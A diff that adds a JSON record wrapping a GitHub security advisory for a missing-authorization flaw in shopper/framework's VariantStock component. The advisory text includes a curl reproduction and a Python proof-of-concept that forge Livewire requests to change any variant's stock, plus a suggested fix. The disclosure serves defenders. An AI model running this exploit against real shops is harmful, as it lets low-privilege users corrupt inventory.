@@ -1,0 +1,59 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"credits\": [{\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/74800891?v=4\", \"events_url\": \"https://api.github.com/users/therawdev/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/therawdev/followers\", \"following_url\": \"https://api.github.com/users/therawdev/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/therawdev/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/therawdev\", \"id\": 74800891, \"login\": \"therawdev\", \"node_id\": \"MDQ6VXNlcjc0ODAwODkx\", \"organizations_url\": \"https://api.github.com/users/therawdev/orgs\", \"received_events_url\": \"https://api.github.com/users/therawdev/received_events\", \"repos_url\": \"https://api.github.com/users/therawdev/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/therawdev/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/therawdev/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/therawdev\", \"user_view_type\": \"public\"}}], \"cve_id\": \"CVE-2026-56829\", \"cvss\": {\"score\": 8.1, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:H\"}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 8.1, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:H\"}, \"cvss_v4\": {\"score\": 0.0, \"vector_string\": null}}, \"cwes\": [{\"cwe_id\": \"CWE-862\", \"name\": \"Missing Authorization\"}], \"description\": \"## Title\\n\\nUnauthorized inventory stock manipulation via unlocked variant property in VariantStock component\\n\\n## Description\\n\\nA lack of authorization control was discovered in the `stockAction()` method in `packages/admin/src/Livewire/Components/Products/VariantStock.php`. The component exposes a `public $variant` property without the `#[Locked]` attribute, so the variant ID is client-mutable via the Livewire wire payload. The `stockAction()` returns an Action with no `->authorize(...)` chain, meaning any authenticated admin-panel session, including browse-only staff who hold zero edit permissions, can call this action to adjust inventory levels for any product variant. The combination of missing authorization and an unlocked model binding lets the attacker both bypass the permission gate and redirect the mutation to an arbitrary variant in the database.\\n\\n## Severity\\n\\nCVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:H  Score: 8.1  (High)\\n\\n## Affected files\\n\\n- `packages/admin/src/Livewire/Components/Products/VariantStock.php:34-91`\\n\\n```php\\n// Line 34 - unprotected, client-mutable variant binding\\npublic $variant;\\n\\n// Lines 36-91 - no ->authorize(...) on the Action\\npublic function stockAction(): Action\\n{\\n    return Action::make('stock')\\n        ->label(__('shopper::forms.actions.update'))\\n        ->color('gray')\\n        ->icon(Untitledui::Package)\\n        ->modalHeading(__('shopper::pages/products.modals.variants.title'))\\n        ->modalWidth(Width::Large)\\n        ->schema([\\n            Select::make('inventory')\\n                ->label(__('shopper::pages/products.inventory_name'))\\n                ->options(Inventory::query()->pluck('name', 'id'))\\n                ->native(false)\\n                ->required(),\\n            TextInput::make('quantity')\\n                ->label(__('shopper::forms.label.quantity'))\\n                ->placeholder('-10 or -5 or 50, etc')\\n                ->numeric()\\n                ->required(),\\n        ])\\n        ->action(function (array $data): void {\\n            // ...calls $this->variant->mutateStock(...) or decreaseStock(...)\\n            // with no permission check anywhere in this path\\n        });\\n}\\n```\\n\\n## Steps to reproduce\\n\\nPrerequisites: an admin-panel account with any role (including a role that holds only `browse_products` or `browse_orders`). No `edit_product_variants` permission is required.\\n\\n```bash\\n# Step 1: Log in and obtain a session cookie and Livewire CSRF token.\\n# Obtain them from a normal browser login, then use them below.\\n\\nSESSION=\\\"laravel_session=<your_session_value>\\\"\\nXSRF=\\\"X-XSRF-TOKEN: <url-decoded-value-of-XSRF-TOKEN-cookie>\\\"\\n\\n# Step 2: Load the product variant page for any variant ID (e.g., 1).\\n# Capture the Livewire snapshot from the page source.\\n\\n# Step 3: Call the stock action on an arbitrary variant.\\n# The wire payload sets \\\"component.variant\\\" to any variant ID in the database.\\n\\ncurl -s -X POST http://localhost/shopper/livewire/update \\\\\\n  -H \\\"Content-Type: application/json\\\" \\\\\\n  -H \\\"$XSRF\\\" \\\\\\n  -H \\\"Cookie: $SESSION\\\" \\\\\\n  -d '{\\n    \\\"components\\\": [{\\n      \\\"snapshot\\\": \\\"{\\\\\\\"id\\\\\\\":\\\\\\\"VARIANT_STOCK_COMPONENT_ID\\\\\\\",\\\\\\\"data\\\\\\\":{\\\\\\\"variant\\\\\\\":42},\\\\\\\"checksum\\\\\\\":\\\\\\\"...\\\\\\\"}\\\",\\n      \\\"updates\\\": {},\\n      \\\"calls\\\": [{\\\"path\\\":\\\"\\\",\\\"method\\\":\\\"callAction\\\",\\\"params\\\":[\\\"stock\\\",{\\\"inventory\\\":1,\\\"quantity\\\":999}]}]\\n    }]\\n  }'\\n# Expected: HTTP 200, variant 42 stock increased by 999 regardless of caller permissions.\\n```\\n\\n## Proof of concept\\n\\n```python\\n#!/usr/bin/env python3\\n\\\"\\\"\\\"\\nVariantStock authorization bypass PoC.\\n\\nSet these environment variables before running:\\n  BASE_URL        e.g. http://localhost\\n  SESSION_COOKIE  value of the laravel_session cookie\\n  XSRF_TOKEN      URL-decoded value of the XSRF-TOKEN cookie\\n  COMPONENT_ID    Livewire component snapshot ID (from page source)\\n  VARIANT_ID      integer ID of any target variant\\n  INVENTORY_ID    integer ID of the target inventory location\\n  QUANTITY        integer quantity adjustment (positive or negative)\\n\\\"\\\"\\\"\\n\\nimport json\\nimport os\\nimport requests\\n\\nbase_url      = os.environ['BASE_URL']\\nsession       = os.environ['SESSION_COOKIE']\\nxsrf          = os.environ['XSRF_TOKEN']\\ncomponent_id  = os.environ['COMPONENT_ID']\\nvariant_id    = int(os.environ['VARIANT_ID'])\\ninventory_id  = int(os.environ['INVENTORY_ID'])\\nquantity      = int(os.environ['QUANTITY'])\\n\\nheaders = {\\n    'Content-Type': 'application/json',\\n    'Accept': 'text/html, application/xhtml+xml',\\n    'X-XSRF-TOKEN': xsrf,\\n    'Cookie': f'laravel_session={session}',\\n    'X-Livewire': '1',\\n}\\n\\nsnapshot = json.dumps({\\n    'id': component_id,\\n    'data': {'variant': variant_id},\\n    'checksum': 'UNLOCKED_PROP_NO_CHECKSUM_NEEDED',\\n})\\n\\npayload = {\\n    'components': [{\\n        'snapshot': snapshot,\\n        'updates': {},\\n        'calls': [{\\n            'path': '',\\n            'method': 'callAction',\\n            'params': ['stock', {\\n                'inventory': inventory_id,\\n                'quantity': quantity,\\n            }]\\n        }]\\n    }]\\n}\\n\\nr = requests.post(f'{base_url}/shopper/livewire/update', headers=headers, json=payload)\\nprint(f'Status: {r.status_code}')\\nprint(r.text[:500])\\n```\\n\\n## Impact\\n\\nAny authenticated admin panel user, regardless of role, can set the inventory quantity of any product variant to an arbitrary value. A browse-only staff member holding only `browse_products` can zero out stock for every variant (triggering out-of-stock states store-wide) or inflate stock counts to bypass stock-gating at checkout. Because `$variant` is not locked, the attacker is not limited to variants visible on their current page; they can target any variant by its integer ID.\\n\\n## Suggested fix\\n\\n```php\\n// packages/admin/src/Livewire/Components/Products/VariantStock.php\\n\\nuse Livewire\\\\Attributes\\\\Locked;\\n\\n#[Locked]                     // prevent client-side ID substitution\\npublic $variant;\\n\\npublic function stockAction(): Action\\n{\\n    return Action::make('stock')\\n        ->authorize('edit_product_variants')   // add this\\n        // ... rest of the action\\n```\\n\\n## Credits\\n\\nReported by Vishal Shukla ([@shukla304](https://github.com/shukla304) / [@therawdev](https://github.com/therawdev)).\", \"ghsa_id\": \"GHSA-g3f9-g5vj-p62f\", \"github_reviewed_at\": \"2026-09-11T21:29:20Z\", \"html_url\": \"https://github.com/advisories/GHSA-g3f9-g5vj-p62f\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-g3f9-g5vj-p62f\"}, {\"type\": \"CVE\", \"value\": \"CVE-2026-56829\"}], \"nvd_published_at\": null, \"published_at\": \"2026-09-11T21:29:20Z\", \"references\": [\"https://github.com/shopperlabs/shopper/security/advisories/GHSA-g3f9-g5vj-p62f\", \"https://github.com/advisories/GHSA-g3f9-g5vj-p62f\"], \"repository_advisory_url\": \"https://api.github.com/repos/shopperlabs/shopper/security-advisories/GHSA-g3f9-g5vj-p62f\", \"severity\": \"high\", \"source_code_location\": \"https://github.com/shopperlabs/shopper\", \"summary\": \"Shopper: Unauthorized inventory stock manipulation via unlocked variant property in VariantStock component\", \"type\": \"reviewed\", \"updated_at\": \"2026-09-11T21:29:21Z\", \"url\": \"https://api.github.com/advisories/GHSA-g3f9-g5vj-p62f\", \"vulnerabilities\": [{\"first_patched_version\": \"2.9.2\", \"package\": {\"ecosystem\": \"composer\", \"name\": \"shopper/framework\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \"< 2.9.2\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-g3f9-g5vj-p62f",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "kev_entries": {},
+    "kev_ransomware": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "shopper/framework: < 2.9.2"
+    ],
+    "authentication_required": true,
+    "cves": [
+      "CVE-2026-56829"
+    ],
+    "cvss_score": 8.1,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:H",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "shopper/framework"
+    ],
+    "remote": true,
+    "vendor_severity": "high"
+  },
+  "first_seen_at": "2026-09-12T19:11:33.368225Z",
+  "provenance": {
+    "content_sha256": "ff58e846213626e20168f1192d695141fa5dc6ce9d2f1dfd225b3b1c9814bb28",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-09-11T21:29:20Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-g3f9-g5vj-p62f",
+  "status": "active",
+  "title": "Shopper: Unauthorized inventory stock manipulation via unlocked variant property in VariantStock component",
+  "updated_at": "2026-09-11T21:29:21Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-g3f9-g5vj-p62f"
+}
